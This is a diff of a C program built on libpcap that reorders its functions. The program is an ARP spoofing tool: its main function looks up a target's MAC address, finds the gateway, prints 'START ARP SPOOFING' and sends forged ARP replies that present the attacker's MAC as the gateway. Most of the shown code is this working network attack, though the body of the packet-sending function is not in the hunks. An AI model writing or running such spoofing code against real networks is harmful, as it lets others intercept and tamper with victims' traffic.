@@ -7,43 +7,29 @@
 #include <netinet/ether.h>
 #include <arpa/inet.h>
 
-int  IPtoMAC(const char *dev, const struct in_addr IP, struct ether_addr *MAC);
-void init_pcd(pcap_t **pcd, char **dev);
-void getMyAddress(const char *dev, struct in_addr *myIP, struct ether_addr *myMAC);
-void getGateway(const char *dev, struct in_addr *gateway);
-void sendARP(pcap_t *pcd, const struct in_addr dstIP, const struct ether_addr dstMAC, const struct in_addr srcIP, const struct ether_addr srcMAC);
 
-
-int main(int argc, char **argv)
+void init_pcd(pcap_t **pcd, char **dev)
 {
-	pcap_t *pcd;
-	char *dev;
+    char errbuf[PCAP_ERRBUF_SIZE];
 
-	struct in_addr myIP, dstIP, gateway;
-	struct ether_addr myMAC, dstMAC;
+    *dev = pcap_lookupdev(errbuf);
 
-	init_pcd(&pcd, &dev);
+    if(dev == NULL)
+    {
+        printf("%s\n",errbuf);
+        exit(1);
+    }
+    
+    *pcd = pcap_open_live(*dev, BUFSIZ,  1, -1, errbuf);
 
-	if (inet_aton(argv[1], &dstIP) == 0)
-	{
-		printf("Error: invalid IP : %s \n", argv[1]);
-		exit(1);
-	}
-	if (IPtoMAC(dev, dstIP, &dstMAC) == -1)
-	{
-		printf("Error: given IP(%s) is not in the ARP table.\n", argv[1]);
-		exit(1);
-	}
-	
-	getMyAddress(dev, &myIP, &myMAC);
-	getGateway(dev, &gateway);
+    if (*pcd == NULL)
+    {
+        printf("%s\n", errbuf);
+        exit(1);
+    }
 
-	printf("START ARP SPOOFING\n");
-	sendARP(pcd, dstIP, dstMAC, gateway, myMAC);
-
-	return 0;
+    return;
 }
-
 
 
 void sendARP(pcap_t *pcd, const struct in_addr dstIP, const struct ether_addr dstMAC, const struct in_addr srcIP, const struct ether_addr srcMAC)
@@ -87,31 +73,6 @@ void sendARP(pcap_t *pcd, const struct in_addr dstIP, const struct ether_addr ds
 
     return;
 }
-
-
-void init_pcd(pcap_t **pcd, char **dev)
-{
-    char errbuf[PCAP_ERRBUF_SIZE];
-
-    *dev = pcap_lookupdev(errbuf);
-
-    if(dev == NULL)
-    {
-        printf("%s\n",errbuf);
-        exit(1);
-    }
-    
-    *pcd = pcap_open_live(*dev, BUFSIZ,  1, -1, errbuf);
-
-    if (*pcd == NULL)
-    {
-        printf("%s\n", errbuf);
-        exit(1);
-    }
-
-    return;
-}
-
 
 void getGateway(const char *dev, struct in_addr *gateway)
 {
@@ -177,5 +138,36 @@ int IPtoMAC(const char *dev, const struct in_addr IP, struct ether_addr *MAC)
     ether_aton_r(MACbuf, MAC);
 
     return 0;
+}
+
+
+int main(int argc, char **argv)
+{
+	pcap_t *pcd;
+	char *dev;
+
+	struct in_addr myIP, dstIP, gateway;
+	struct ether_addr myMAC, dstMAC;
+
+	init_pcd(&pcd, &dev);
+
+	if (inet_aton(argv[1], &dstIP) == 0)
+	{
+		printf("Error: invalid IP : %s \n", argv[1]);
+		exit(1);
+	}
+	if (IPtoMAC(dev, dstIP, &dstMAC) == -1)
+	{
+		printf("Error: given IP(%s) is not in the ARP table.\n", argv[1]);
+		exit(1);
+	}
+	
+	getMyAddress(dev, &myIP, &myMAC);
+	getGateway(dev, &gateway);
+
+	printf("START ARP SPOOFING\n");
+	sendARP(pcd, dstIP, dstMAC, gateway, myMAC);
+
+	return 0;
 }
 
